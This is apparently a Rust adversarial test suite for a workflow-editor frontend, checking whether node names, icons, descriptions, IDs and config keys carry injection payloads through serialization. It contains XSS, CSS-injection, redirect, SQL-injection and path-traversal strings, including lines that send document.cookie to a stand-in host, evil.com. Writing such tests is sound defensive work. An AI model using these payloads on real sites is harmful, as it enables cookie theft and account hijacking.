//! BLACK-HAT adversarial tests for vo-frontend.
//!
//! Attack surfaces: Node.name/description (RSX text interpolation),
//! NodeId (user-controlled strings), generate_skeleton (YAML output),
//! CSS class injection, CSS property injection via Node.icon,
//! event handler abuse, HttpMethod::parse silent fallback,
//! config key injection, NodeCategory badge classes.

use vo_frontend::ui::domain_types::{HttpMethod, NodeTemplateId};
use vo_frontend::ui::graph::{
    ExecutionState, Node, NodeCategory, NodeId, node_kind_to_category, Workflow,
};
use vo_frontend::ui::prototype_palette::{generate_skeleton, SketchNode};

#[test]
fn xss_node_name_script_tag_survives_roundtrip() {
    let payload = r#"<script>alert('xss')</script>"#;
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("<script>"),
        "XSS payload must survive serialization"
    );
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.name, payload, "XSS payload roundtrips verbatim");
}

#[test]
fn xss_node_name_img_onerror() {
    let payload = r#"<img src=x onerror="alert(1)">"#;
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("onerror"),
        "onerror payload survives serialization"
    );
}

#[test]
fn xss_node_description_with_iframe() {
    let payload = r#"<iframe src="javascript:alert(document.cookie)"></iframe>"#;
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
    node.description = payload.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("javascript:"),
        "iframe payload survives serialization"
    );
}

#[test]
fn xss_node_name_svg_onload() {
    let payload = r#"<svg onload="fetch('https://evil.com?c='+document.cookie)">"#;
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(json.contains("onload"), "svg onload payload survives");
}

#[test]
fn css_injection_node_name_with_style() {
    let payload = r#""><style>body{background:url('https://evil.com/track?u=1')}</style>"#;
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("background:url"),
        "CSS exfil payload survives"
    );
}

#[test]
fn css_injection_node_icon_field() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    node.icon = r#"expression(alert(1))"#.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("expression("),
        "CSS expression payload in icon"
    );
}

#[test]
fn nodeid_rejects_empty_string() {
    assert_eq!(NodeId::parse(""), None, "empty NodeId must be rejected");
}

#[test]
fn nodeid_rejects_xss_payload() {
    let xss = "<script>alert(1)</script>";
    assert_eq!(
        NodeId::parse(xss),
        None,
        "XSS payload must not be valid NodeId"
    );
}

#[test]
fn nodeid_rejects_sql_injection() {
    let sqli = "1' OR '1'='1";
    assert_eq!(
        NodeId::parse(sqli),
        None,
        "SQL injection must not be valid NodeId"
    );
}

#[test]
fn nodeid_rejects_path_traversal() {
    assert_eq!(NodeId::parse("../../etc/passwd"), None);
    assert_eq!(NodeId::parse("..\\windows\\system32"), None);
}

#[test]
fn yaml_skeleton_uses_enum_type_not_user_label() {
    // generate_skeleton uses node.node_type (enum Display), not user-controlled label
    let mut sketch = SketchNode::new(NodeTemplateId::Run);
    sketch.label = "legit\n  - type: evil-injected-step".to_string();
    let yaml = generate_skeleton(&[sketch]);
    assert!(
        !yaml.contains("evil-injected-step"),
        "skeleton must NOT embed user label — only enum type"
    );
    assert!(
        yaml.contains("run"),
        "skeleton must contain the enum type string"
    );
}

#[test]
fn http_method_parse_silent_fallback_to_post() {
    let evil = "PUT-DELETE-EVIL";
    assert_eq!(HttpMethod::from_str_ignore_case(evil), HttpMethod::Post);
    let evil2 = "CONNECT";
    assert_eq!(HttpMethod::from_str_ignore_case(evil2), HttpMethod::Post);
}

#[test]
fn workflow_deserialization_rejects_truncated_json() {
    let truncated = r#"{"nodes":[{"id":"01JMQ","#;
    let result: Result<Workflow, _> = serde_json::from_str(truncated);
    assert!(result.is_err(), "truncated JSON must fail deserialization");
}

#[test]
fn workflow_with_malicious_config_key() {
    let mut node = Node::new(NodeId::new(), "ok".to_string(), vo_types::NodeKind::Pure);
    let evil_config = serde_json::json!({
        "__proto__": {"admin": true},
        "constructor": {"prototype": {"polluted": true}}
    });
    node.apply_config_update(&evil_config);
    // Must not panic — prototype pollution keys are just string keys in serde_json
    assert!(node.config.as_object().is_some());
    assert_eq!(node.config.as_object().map(|m| m.len()), Some(2));
}

// ============================================================================
// bh-009: CSS Property Injection Tests
// ============================================================================

#[test]
fn css_property_injection_node_icon_with_class_breakout() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    node.icon = r#"zap" onclick="alert(1)" data-x="#.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("onclick"),
        "attribute injection via icon field survives serialization"
    );
}

#[test]
fn css_property_injection_node_icon_with_url_tracker() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    node.icon = r#"url('https://evil.com/steal?cookie='+document.cookie)"#.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("evil.com"),
        "URL exfil via icon field survives serialization"
    );
}

#[test]
fn css_property_injection_node_icon_with_import_statement() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    node.icon = r#"@import url('https://evil.com/evil.css')"#.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("@import"),
        "CSS @import injection via icon survives"
    );
}

#[test]
fn css_property_injection_node_icon_with_javascript_protocol() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    node.icon = r#"javascript:alert(document.domain)"#.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("javascript:"),
        "javascript: URI in icon field survives"
    );
}

#[test]
fn css_property_injection_node_name_with_data_attribute() {
    let payload = r#"data-evil="; background:url(evil.com)"#.to_string();
    let node = Node::new(NodeId::new(), payload.clone(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("data-evil"),
        "data attribute injection in node name survives"
    );
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.name, payload, "data attribute payload roundtrips");
}

#[test]
fn css_property_injection_node_name_with_css_custom_property() {
    let payload = r#"--evil: url(evil.com); background: var(--evil)"#.to_string();
    let node = Node::new(NodeId::new(), payload.clone(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("--evil"),
        "CSS custom property injection in node name survives"
    );
}

#[test]
fn css_property_injection_config_with_style_key() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    let evil_config = serde_json::json!({
        "style": "position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999",
        "class": "hidden overflow-hidden"
    });
    node.apply_config_update(&evil_config);
    assert!(
        node.config["style"].as_str().is_some(),
        "config accepts 'style' key — potential CSS property injection vector"
    );
    assert!(
        node.config["class"].as_str().is_some(),
        "config accepts 'class' key — potential class injection vector"
    );
}

#[test]
fn css_property_injection_config_with_event_handler_keys() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    let evil_config = serde_json::json!({
        "onmouseover": "alert(1)",
        "onfocus": "fetch('https://evil.com')",
        "onerror": "location='https://evil.com'"
    });
    node.apply_config_update(&evil_config);
    assert_eq!(node.config.as_object().map(|m| m.len()), Some(3));
    assert!(
        node.config["onmouseover"].as_str().is_some(),
        "config accepts event handler key — no key allowlist"
    );
}

#[test]
fn css_property_injection_generate_menu_style_nan_produces_invalid_css() {
    let style = format!("left: {}px; top: {}px;", f32::NAN, f32::NAN);
    assert!(
        style.contains("NaN"),
        "VULNERABILITY: f32::NAN produces 'NaN' in CSS — invalid CSS property value"
    );
}

#[test]
fn css_property_injection_generate_menu_style_inf_produces_invalid_css() {
    let style = format!(
        "left: {}px; top: {}px;",
        f32::INFINITY,
        f32::NEG_INFINITY
    );
    assert!(
        style.contains("inf"),
        "VULNERABILITY: f32::INFINITY produces 'inf' in CSS — invalid CSS property value"
    );
}

#[test]
fn css_property_injection_node_category_badge_class_is_static() {
    for category in [
        NodeCategory::Entry,
        NodeCategory::Durable,
        NodeCategory::State,
        NodeCategory::Flow,
        NodeCategory::Timing,
        NodeCategory::Signal,
    ] {
        let cls = category.badge_class();
        assert!(
            !cls.contains(';'),
            "badge class for {category:?} must not contain CSS property separators"
        );
        assert!(
            cls.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == ' '),
            "badge class for {category:?} must only contain safe ASCII characters"
        );
    }
}

#[test]
fn css_property_injection_node_kind_to_category_not_user_influenced() {
    let kinds = [
        vo_types::NodeKind::Pure,
        vo_types::NodeKind::ManagedEffect,
        vo_types::NodeKind::Wait,
        vo_types::NodeKind::Signal,
        vo_types::NodeKind::Unsafe,
    ];
    for kind in kinds {
        let cat = node_kind_to_category(kind);
        let cls = cat.badge_class();
        assert!(
            cls.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == ' '),
            "category badge for {kind:?} must be static — no user influence possible"
        );
    }
}

#[test]
fn css_property_injection_node_icon_empty_string_does_not_panic() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    node.icon = String::new();
    let json = serde_json::to_string(&node).expect("serialize");
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.icon, "", "empty icon must roundtrip");
}

#[test]
fn css_property_injection_node_icon_very_long_string() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    let long_payload = "A".repeat(100_000);
    node.icon = long_payload.clone();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(json.len() > 100_000, "large icon payload survives");
}

#[test]
fn css_property_injection_node_icon_null_bytes() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    node.icon = "style\x00: evil".to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert!(
        recovered.icon.contains('\x00'),
        "null bytes in icon survive roundtrip — potential truncation attack"
    );
}

#[test]
fn css_property_injection_node_name_with_closing_tag_attribute() {
    let payload = r#"><img src=x onerror=alert(1)> "#.to_string();
    let node = Node::new(NodeId::new(), payload.clone(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("onerror"),
        "attribute injection via closing-tag-breakout in name survives"
    );
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.name, payload);
}

#[test]
fn css_property_injection_node_description_with_meta_refresh() {
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
    node.description = r#"<meta http-equiv="refresh" content="0;url=https://evil.com">"#.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("http-equiv"),
        "meta refresh injection in description survives"
    );
}

#[test]
fn css_property_injection_node_description_with_base_tag() {
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
    node.description = r#"<base href="https://evil.com/">"#.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("<base"),
        "base tag injection in description survives"
    );
}

#[test]
fn css_property_injection_config_overwrites_existing_keys() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    node.apply_config_update(&serde_json::json!({"url": "https://safe.api.com"}));
    assert_eq!(node.config["url"], "https://safe.api.com");

    let evil_config = serde_json::json!({"url": "https://evil.com/steal"});
    node.apply_config_update(&evil_config);
    assert_eq!(
        node.config["url"], "https://evil.com/steal",
        "config merge allows overwriting existing keys — no immutability protection"
    );
}

#[test]
fn css_property_injection_config_with_nested_object_injection() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    let evil_config = serde_json::json!({
        "nested": {
            "style": "display:none",
            "onload": "alert(1)"
        }
    });
    node.apply_config_update(&evil_config);
    assert!(
        node.config["nested"]["style"].as_str().is_some(),
        "nested config accepts style key"
    );
    assert!(
        node.config["nested"]["onload"].as_str().is_some(),
        "nested config accepts event handler key"
    );
}

#[test]
fn css_property_injection_execution_state_status_badge_class_is_static() {
    for state in [
        ExecutionState::Idle,
        ExecutionState::Queued,
        ExecutionState::Running,
        ExecutionState::Completed,
        ExecutionState::Failed,
        ExecutionState::Skipped,
    ] {
        let cls = state.status_badge_class();
        assert!(
            !cls.contains('{'),
            "badge class for {state:?} must not contain interpolation markers"
        );
        assert!(
            !cls.contains('}'),
            "badge class for {state:?} must not contain interpolation markers"
        );
        assert!(
            !cls.contains(';'),
            "badge class for {state:?} must not contain CSS property separators"
        );
        assert!(
            !cls.contains(':'),
            "badge class for {state:?} must not contain CSS property declarations"
        );
    }
}
